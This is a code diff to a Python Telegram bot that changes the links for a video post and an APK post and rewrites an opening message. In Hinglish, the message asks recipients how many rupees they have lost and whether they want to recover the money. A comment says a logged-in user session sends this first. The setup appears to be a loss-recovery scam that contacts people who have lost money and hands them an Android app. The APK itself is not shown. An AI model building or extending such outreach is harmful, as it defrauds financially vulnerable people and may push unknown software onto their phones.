@@ -23,12 +23,12 @@ API_HASH = os.environ["API_HASH"]
 BOT_TOKEN = os.environ["BOT_TOKEN"]
 STRING_SESSION = os.environ["STRING_SESSION"]
 
-VIDEO_POST_URL = "https://t.me/rbots12646/97"
-APK_POST_URL = "https://t.me/rbots12646/98"
+VIDEO_POST_URL = "https://t.me/HARSHUREQASSETS/4"
+APK_POST_URL = "https://t.me/HARSHUREQASSETS/3"
 
 # Sent first by the account logged in through STRING_SESSION.
 INTRO_MESSAGE = (
-    'Kitna loss hai apka bhai ???'
+    'KITNE RUPEES KA LOSS HUA TUMHARA RECOVER KRNA CHAHTE HO?'
 )
 
 # Bot message 1: welcome text. {name} is replaced with the requester's first name.
